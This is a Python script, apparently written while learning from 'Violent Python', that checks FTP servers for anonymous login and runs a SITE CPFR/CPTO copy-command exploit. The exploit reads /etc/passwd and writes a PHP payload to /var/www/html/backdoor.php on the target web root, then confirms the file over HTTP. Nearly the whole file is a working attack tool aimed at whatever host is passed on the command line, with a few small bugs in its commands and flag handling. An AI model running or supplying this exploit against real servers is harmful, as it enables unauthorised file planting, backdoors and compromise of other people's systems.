# Learning how to exploit FTP from both Violent python - Python peneration testing and other
from optparse import OptionParser
import ftplib
import socket
import requests
import time

path = '/var/www/html/backdoor.php'

def anonymousLogin(target, port):
    try:
        ftp = ftplib.FTP(target)
        ftp.login('anonymous', 'me@your.com')
        print("[+] FTP Anonymous Login Succeeded")
        print(ftp.getwelcome())
        ftp.quit()
        return True
    except Exception as e:
        print("[-] FTP Anonymous Login Failed")
        print(f"[-] {e}")
        return False

def CopyModeExploit(target, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, int(port)))
        print(f"[+] Information: {s.recv(1024).decode('utf-8')}")
        print("[!] Attempting the exploit")

        # EXPLOIT TO COPY FROM MY BACKDOOR.PHP TO TARGET USING THE CPFR CPTO COmmands
        s.send(b'site cpfr /etc/passwd\rn\n')
        print(s.recv(1024).decode())
        s.send(b'site cpto <?php phpinfo(); ?>\r\n')
        print(s.recv(1024).decode())
        s.send(b'site cpfr /proc/self/fd/3\r\n')
        print(s.recv(1024).decode())
        s.send(b'site cpto /var/www/html/backdoor.php\r\n')
        print(s.recv(1024).decode())
        s.close()
        print('[+] Exploit Completed')

        time.sleep(5)

        print('[+] Checking URL')
        url = 'http://'+target+'/backdoor.php'
        r = requests.get(url)
        if r.status_code == 200:
            print('[+] File Written Successfully')
        else:
            print('[!] Something Went Wrong')
            print('[!] Directory might not be writable')

    except Exception as e:
        print("[-] Copy mode exploit failed")
        print(f"[-] {e}")


def main():
    parser = OptionParser('usrage %prog -t <target host>')
    parser.add_option('-t', dest='tgtHost', type='string', help='Specify the target ip address')
    parser.add_option('-p', dest='tgtPort', default='21', type='string', help='Specify the tagrte port')
    parser.add_option('-a', action='store_true', help='Testing the anonymous Login')
    parser.add_option('-c', action='store_true', help='Testing the CopyModeExploit')
    (option, args) = parser.parse_args()
    tgtHost = str(option.tgtHost)
    tgtPort = str(option.tgtPort)
    print(tgtHost, tgtPort)


    if option.a:
        print(f"[+] Testing the anonymous Login for {tgtHost}")
        anonymousLogin(tgtHost, tgtPort)

    print(f"[+] Testing the CopyModeExploit for {tgtHost}")
    CopyModeExploit(tgtHost, tgtPort)


main()
